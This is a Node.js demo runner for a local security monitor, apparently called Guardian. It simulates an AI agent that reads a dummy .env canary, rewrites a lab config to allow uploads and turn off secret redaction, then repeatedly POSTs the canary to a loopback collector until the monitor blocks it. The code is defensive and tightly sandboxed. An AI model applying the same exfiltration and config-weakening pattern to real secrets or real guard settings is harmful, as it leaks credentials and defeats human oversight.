// Cooperative lab only. Never scan the home directory or send user-provided bytes.
const fs = require("node:fs");
const fsp = require("node:fs/promises");
const net = require("node:net");
const path = require("node:path");
const { randomUUID } = require("node:crypto");
const { setTimeout: sleep } = require("node:timers/promises");

const CANARY = "GUARDIAN_DEMO_TOKEN=NO_ES_UN_SECRETO\n";
const ENDPOINT = "http://127.0.0.1:8787/collect";
class DemoError extends Error {}

function request(method, params = {}) {
  return new Promise((resolve, reject) => {
    const id = randomUUID();
    const socket = net.createConnection(process.env.GUARDIAN_SOCKET || `/tmp/guardian-${process.getuid()}/agent.sock`);
    let buffer = Buffer.alloc(0);
    const fail = (message) => { socket.destroy(); reject(new DemoError(message)); };
    socket.setTimeout(8000, () => fail("Guardian no respondió a tiempo; se detiene la demo."));
    socket.on("error", () => fail("No se pudo conectar con Guardian. Activa la vigilancia local y prepara el laboratorio."));
    socket.on("end", () => fail("Guardian cerró la conexión antes de responder."));
    socket.on("connect", () => socket.write(JSON.stringify({ id, method, params }) + "\n"));
    socket.on("data", (chunk) => {
      buffer = Buffer.concat([buffer, chunk]);
      if (buffer.length > 8 * 1024 * 1024) return fail("La respuesta de laboratorio supera el límite permitido.");
      const newline = buffer.indexOf(10);
      if (newline < 0) return;
      try {
        const response = JSON.parse(buffer.subarray(0, newline).toString("utf8"));
        if (response.id !== id || response.error || !response.result || typeof response.result !== "object") {
          return fail("Guardian rechazó la solicitud. Prepara un laboratorio nuevo en Actividad → Alertas.");
        }
        socket.destroy();
        resolve(response.result);
      } catch {
        fail("La respuesta de laboratorio no es válida.");
      }
    });
  });
}

function createDemoRunner(onEvent) {
  const controller = new AbortController();
  let running = false;
  let root;
  let rootIdentity;
  let configDevice;
  let configInode;

  async function checkDirectory() {
    const info = await fsp.lstat(root);
    if (!info.isDirectory() || info.uid !== process.getuid() || info.dev !== rootIdentity.dev ||
        info.ino !== rootIdentity.ino || (await fsp.realpath(root)) !== root) {
      throw new DemoError("La carpeta del laboratorio cambió; se detiene la demo.");
    }
  }

  async function fixture(name, write = false) {
    await checkDirectory();
    const handle = await fsp.open(path.join(root, name),
      (write ? fs.constants.O_RDWR : fs.constants.O_RDONLY) | fs.constants.O_NOFOLLOW | fs.constants.O_NONBLOCK);
    try {
      const info = await handle.stat();
      if (!info.isFile() || info.uid !== process.getuid() || info.nlink !== 1 || info.size > 4096 || (info.mode & 0o6000)) {
        throw new DemoError("El archivo del laboratorio cambió; no se leerá ni enviará.");
      }
      if (write) {
        const original = await handle.stat({ bigint: true });
        if (original.dev.toString() !== configDevice || original.ino.toString() !== configInode) {
          throw new DemoError("La configuración ya no es el archivo generado por Guardian; se detiene la demo.");
        }
        await handle.truncate(0);
        await handle.writeFile(JSON.stringify({ allow_uploads: true, redact_secrets: false }));
        await handle.sync();
        return;
      }
      const buffer = Buffer.alloc(4097);
      const { bytesRead } = await handle.read(buffer, 0, buffer.length, 0);
      const after = await handle.stat();
      if (bytesRead !== info.size || info.size !== after.size || info.mtimeMs !== after.mtimeMs || info.ctimeMs !== after.ctimeMs) {
        throw new DemoError("El archivo cambió durante la lectura; se detiene la demo.");
      }
      return buffer.subarray(0, bytesRead).toString("utf8");
    } finally {
      await handle.close();
    }
  }

  async function run() {
    let sent = 0;
    try {
      const status = await request("status");
      if (!status.demo) {
        throw new DemoError("El servicio de Guardian en ejecución es anterior al laboratorio. Reinicia Arkangel y su servicio desde este checkout.");
      }
      if (status.demo.enabled !== true) {
        throw new DemoError("Prepara el laboratorio en Arkangel → Actividad → Alertas antes de iniciar el asistente.");
      }
      const session = await request("demo.attach");
      if (typeof session.session_id !== "string" || !/^[a-f0-9-]{36}$/.test(session.session_id) ||
          typeof session.directory !== "string" || !path.isAbsolute(session.directory) ||
          path.normalize(session.directory) !== session.directory ||
          typeof session.config_device !== "string" || !/^\d+$/.test(session.config_device) ||
          typeof session.config_inode !== "string" || !/^\d+$/.test(session.config_inode)) {
        throw new DemoError("Guardian no proporcionó una sesión de laboratorio válida.");
      }
      root = session.directory;
      configDevice = session.config_device;
      configInode = session.config_inode;
      rootIdentity = await fsp.lstat(root);
      if (controller.signal.aborted) return;
      const content = await fixture(".env");
      if (content !== CANARY) throw new DemoError("El .env ya no contiene únicamente el marcador ficticio. No se enviará.");
      // The only intentionally weakened file is the config created by Guardian for this session.
      await fixture("config.json", true);
      onEvent({ type: "thought", text: "Frame debilitó la configuración ficticia: permite envíos sin ocultar el marcador." });
      onEvent({ type: "found", files: [".env (ficticio)"] });
      await request("demo.report", { session_id: session.session_id, event: "file_read" });
      onEvent({ type: "file", file: ".env (ficticio)", bytes: Buffer.byteLength(CANARY) });

      for (let index = 0; index < 30 && !controller.signal.aborted; index += 1) {
        const config = JSON.parse(await fixture("config.json"));
        const permission = await request("demo.report", { session_id: session.session_id, event: "upload_attempt" });
        if (permission.allowed !== true || config.allow_uploads !== true || config.redact_secrets !== false) {
          await request("demo.report", { session_id: session.session_id, event: "upload_blocked" });
          onEvent({ type: "blocked", text: "Guardian detuvo los siguientes envíos del laboratorio. Revisa la reparación en Arkangel." });
          break;
        }
        if (controller.signal.aborted) break;
        // Only constant dummy bytes, a literal loopback address, no redirects or model calls.
        const response = await fetch(ENDPOINT, {
          method: "POST", redirect: "error",
          signal: AbortSignal.any([controller.signal, AbortSignal.timeout(5000)]),
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ host: "demo-local", user: "demo", file: ".env", content: CANARY,
            capturedAt: new Date().toISOString() }),
        });
        if (!response.ok) throw new DemoError("El receptor local rechazó el marcador ficticio.");
        await response.body?.cancel();
        sent += 1;
        await request("demo.report", { session_id: session.session_id, event: "upload_succeeded" });
        onEvent({ type: "sent", file: ".env (ficticio)", status: response.status });
        onEvent({ type: "thought", text: "Pulsa Reparar y detener envíos en Arkangel para detener el siguiente intento." });
        await sleep(2000, undefined, { signal: controller.signal });
      }
    } catch (error) {
      if (!controller.signal.aborted) {
        // Never repeat OS errors or file content in the transcript.
        onEvent({ type: "error", text: error instanceof DemoError ? error.message : "La demo se detuvo: comprueba el laboratorio en Arkangel y el receptor local en el puerto 8787. No se usarán archivos reales." });
      }
    } finally {
      onEvent({ type: "done", summary: `Laboratorio finalizado: ${sent} envíos del marcador ficticio al receptor local. Las entregas anteriores se conservan.` });
    }
  }

  return {
    start() {
      if (running) return Promise.resolve();
      running = true;
      return run();
    },
    stop() { controller.abort(); },
  };
}

module.exports = { createDemoRunner };
